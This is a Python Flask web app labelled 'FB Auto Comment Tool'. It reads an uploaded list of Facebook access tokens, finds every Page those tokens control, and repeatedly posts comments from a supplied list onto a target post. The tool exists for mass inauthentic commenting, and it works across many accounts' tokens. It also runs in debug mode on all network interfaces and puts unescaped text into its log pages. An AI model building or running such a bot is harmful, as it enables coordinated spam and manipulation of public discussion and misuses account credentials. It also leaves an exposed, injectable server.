import os
import time
import requests
import random
import string
from threading import Thread, Event
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.debug = True

# Store tasks and logs
tasks = {}
task_logs = {}
comment_logs = {}

# ---------------- Worker ----------------
def worker_comment(task_id, access_tokens, post_id, prefix, interval, comments):
    stop_event = tasks[task_id]["stop"]
    index = 0

    while not stop_event.is_set():
        try:
            for token in access_tokens:
                # Step 1: Get Pages
                pages = []
                try:
                    res = requests.get(
                        "https://graph.facebook.com/v15.0/me/accounts",
                        params={"access_token": token},
                        timeout=10,
                    ).json()
                    if "data" in res:
                        pages = res["data"]
                except Exception as e:
                    now = datetime.now().strftime("%H:%M:%S")
                    task_logs[task_id].append(f"[{now}] ⚠️ Error fetching pages: {e}")
                    continue

                # Step 2: Comment on post
                for page in pages:
                    page_token = page.get("access_token")
                    page_name = page.get("name")
                    page_id = page.get("id")
                    if not page_token:
                        continue

                    comment = f"{prefix} {comments[index]}"
                    url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
                    params = {"access_token": page_token, "message": comment}
                    r = requests.post(url, data=params, timeout=10)

                    now = datetime.now().strftime("%H:%M:%S")
                    if r.status_code == 200:
                        log = f"[{now}] ✅ {page_name} ({page_id}) → {comment}"
                        comment_logs[task_id].append(f"[{now}] {comment}")
                    else:
                        log = f"[{now}] ❌ {page_name} ({page_id}) → {r.text}"

                    task_logs[task_id].append(log)
                    index = (index + 1) % len(comments)

                if stop_event.is_set():
                    break

        except Exception as e:
            now = datetime.now().strftime("%H:%M:%S")
            task_logs[task_id].append(f"[{now}] ⚠️ Exception: {e}")

        time.sleep(interval)

# ---------------- Home Page ----------------
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        tokens_file = request.files["tokens"]
        comments_file = request.files["comments"]
        post_id = request.form["post_id"]
        prefix = request.form.get("prefix", "")
        interval = int(request.form.get("interval", 10))

        access_tokens = tokens_file.read().decode().strip().splitlines()
        comments = comments_file.read().decode().strip().splitlines()

        task_id = "".join(random.choices(string.ascii_letters + string.digits, k=6))
        stop_event = Event()
        tasks[task_id] = {"stop": stop_event}
        task_logs[task_id] = []
        comment_logs[task_id] = []

        t = Thread(target=worker_comment, args=(task_id, access_tokens, post_id, prefix, interval, comments))
        t.daemon = True
        t.start()

        return f"✅ Task started! ID: <b>{task_id}</b><br><a href='/logs/{task_id}'>📜 View Logs</a>"

    return """
    <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>FB Auto Comment</title>
      <style>
        body { background:#111; color:#0f0; font-family:monospace; padding:10px; font-size:14px; }
        h2 { text-align:center; font-size:18px; }
        form { background:#000; padding:12px; border-radius:10px; }
        label { font-size:14px; display:block; margin-top:8px; }
        input, select {
          width:100%; padding:8px; margin-top:5px;
          border-radius:6px; border:1px solid #0f0;
          background:#111; color:#0f0; font-size:14px;
        }
        button {
          width:100%; padding:10px; margin-top:12px;
          border:none; border-radius:6px;
          background:#0f0; color:#000; font-weight:bold; font-size:15px;
        }
      </style>
    </head>
    <body>
      <h2>🤖 FB Auto Comment Tool</h2>
      <form method="post" enctype="multipart/form-data">
        <label>📂 Token File</label>
        <input type="file" name="tokens" required>
        <label>📂 Comments File</label>
        <input type="file" name="comments" required>
        <label>🆔 Post ID</label>
        <input type="text" name="post_id" required>
        <label>🔖 Prefix</label>
        <input type="text" name="prefix">
        <label>⏱ Interval (seconds)</label>
        <input type="number" name="interval" value="10">
        <button type="submit">🚀 Start</button>
      </form>
    </body>
    </html>
    """

# ---------------- Logs Page ----------------
@app.route("/logs/<task_id>")
def logs(task_id):
    log_list = task_logs.get(task_id, [])
    sent_comments = comment_logs.get(task_id, [])

    html = f"""
    <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Logs {task_id}</title>
      <style>
        body {{ background:#111; color:#0f0; font-family:monospace; padding:10px; font-size:13px; }}
        h2 {{ text-align:center; font-size:16px; }}
        .log-box, .comment-box {{
          background:#000; border:1px solid #0f0; border-radius:8px;
          padding:8px; margin-bottom:15px;
          max-height:250px; overflow-y:auto; white-space:pre-wrap;
          font-size:12px;
        }}
        a.button {{
          display:block; text-align:center;
          padding:10px; background:#e00; color:#fff;
          border-radius:6px; text-decoration:none; font-size:14px;
        }}
      </style>
      <script>
        setTimeout(function(){{ window.location.reload(); }}, 2000);
      </script>
    </head>
    <body>
      <h2>📝 Logs - {task_id}</h2>
      <div class="log-box">{'<br>'.join(log_list)}</div>

      <h2>💬 Sent Comments</h2>
      <div class="comment-box">{'<br>'.join(sent_comments)}</div>

      <a href="/stop/{task_id}" class="button">⛔ Stop Task</a>
    </body>
    </html>
    """
    return html

# ---------------- Stop ----------------
@app.route("/stop/<task_id>")
def stop(task_id):
    if task_id in tasks:
        tasks[task_id]["stop"].set()
        return f"⛔ Task {task_id} stopped.<br><a href='/logs/{task_id}'>🔙 Back</a>"
    return "❌ Invalid Task ID"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
